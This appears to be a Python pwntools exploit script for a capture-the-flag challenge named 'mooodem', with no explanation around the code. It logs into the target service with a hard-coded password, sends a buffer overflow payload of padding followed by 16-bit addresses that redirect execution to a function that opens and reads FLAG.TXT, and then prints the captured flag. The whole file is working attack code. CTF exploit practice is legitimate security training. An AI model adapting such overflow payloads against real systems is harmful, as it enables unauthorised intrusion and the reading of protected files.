#!/usr/bin/python3

from pwn import *

p = process('./fooodem.sh')
#p = process(['./mooodem.sh','mooodem.challenges.ooo','5000'])

_ = p.recvuntil('your name?')
p.sendline('FLAG.TXT')
_ = p.recvuntil('Selection:')
p.sendline('supersneaky2020')
_ = p.recvuntil('Selection:')
p.sendline('C')
_ = p.recvuntil('> ')

payload  = 0x106*b'A'
payload += p16(0xe98a) # quote function
#'''
payload += p16(0x1c20) # FLAG.TXT as name
payload += p16(0xbd5)  # rb
'''
payload += p16(0xff8c + 2 + 2 + 2) # return address, pointer to file, pointer to rb, then "FLAG.TXT"
payload += p16(0xbd5)
payload += b'FLAG.TXT\x00'
'''

p.sendline(payload)
p.sendline('')
_ = p.recvuntil('Selection:')
p.sendline('L')
_ = p.recvuntil(b'OOO{')
print(_.decode("unicode_escape")[-4:],end='')
_ = p.recvuntil(b'}')
print(_.decode("unicode_escape"))
